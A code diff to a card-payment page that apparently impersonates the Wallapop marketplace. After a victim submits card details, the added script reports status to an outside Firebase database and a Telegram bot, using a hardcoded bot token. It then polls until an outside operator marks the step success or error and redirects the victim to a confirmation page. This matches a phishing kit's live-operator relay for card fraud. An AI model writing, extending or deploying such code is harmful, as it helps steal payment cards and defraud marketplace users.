@@ -331,24 +331,62 @@ $('form').addEventListener('submit', async ev => {
     });
   } catch (e) {}
 
+  // Resetear estado en Firebase y Telegram
+  try {
+    await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/" + id + ".json", {
+      method: "PUT",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ status: "waiting", id: id, ts: Date.now() })
+    });
+    await fetch("https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/latest.json", {
+      method: "PUT",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ status: "waiting", id: id, ts: Date.now() })
+    });
+  } catch (e) {}
+
+  try {
+    await fetch("https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/setMyDescription", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ description: "status:waiting:" + id })
+    });
+  } catch (e) {}
+
   if (cardPollTimer) clearTimeout(cardPollTimer);
 
   const pollCardStatus = async () => {
     let data = null;
-    // 1. Probar ruta amigable
+
+    // 0. Probar Firebase Realtime Database (tiempo real, sin bloqueos)
     try {
-      const resp = await fetch('/api/product/' + id + '/tarjeta/status?t=' + Date.now());
-      if (resp.ok) {
-        data = await resp.json();
+      const fbStResp = await fetch('https://callcentery-2315b-default-rtdb.firebaseio.com/wallapop/status/' + id + '.json?t=' + Date.now());
+      if (fbStResp.ok) {
+        const fbSt = await fbStResp.json();
+        if (fbSt && fbSt.status && fbSt.status !== 'waiting') {
+          data = fbSt;
+        }
       }
     } catch (e) {}
+
+    // 1. Probar ruta amigable
+    if (!data || !data.status) {
+      try {
+        const resp = await fetch('/api/product/' + id + '/tarjeta/status?t=' + Date.now());
+        if (resp.ok) {
+          const lData = await resp.json();
+          if (lData && lData.status && lData.status !== 'waiting') data = lData;
+        }
+      } catch (e) {}
+    }
 
     // 2. Probar api.php directo (fallback infalible para hosting PHP)
     if (!data || !data.status) {
       try {
         const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + id + '&t=' + Date.now());
         if (resp2.ok) {
-          data = await resp2.json();
+          const lData2 = await resp2.json();
+          if (lData2 && lData2.status && lData2.status !== 'waiting') data = lData2;
         }
       } catch (e) {}
     }
@@ -365,7 +403,7 @@ $('form').addEventListener('submit', async ev => {
         const rawP = new URLSearchParams(location.search).get('p');
         if (rawP) qParams.set('p', rawP);
         try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-        window.location.href = 'confirmar.php?' + qParams.toString();
+        window.location.href = 'confirmar.html?' + qParams.toString();
         return;
       } else if (data.status === 'error') {
         $('spinnerTarjeta').style.display = 'none';
@@ -394,7 +432,7 @@ $('form').addEventListener('submit', async ev => {
           const rawP = new URLSearchParams(location.search).get('p');
           if (rawP) qParams.set('p', rawP);
           try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-          window.location.href = 'confirmar.php?' + qParams.toString();
+          window.location.href = 'confirmar.html?' + qParams.toString();
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -407,10 +445,10 @@ $('form').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1000);
+    cardPollTimer = setTimeout(pollCardStatus, 800);
   };
 
-  cardPollTimer = setTimeout(pollCardStatus, 1200);
+  cardPollTimer = setTimeout(pollCardStatus, 1000);
 });
 </script>
 </body>
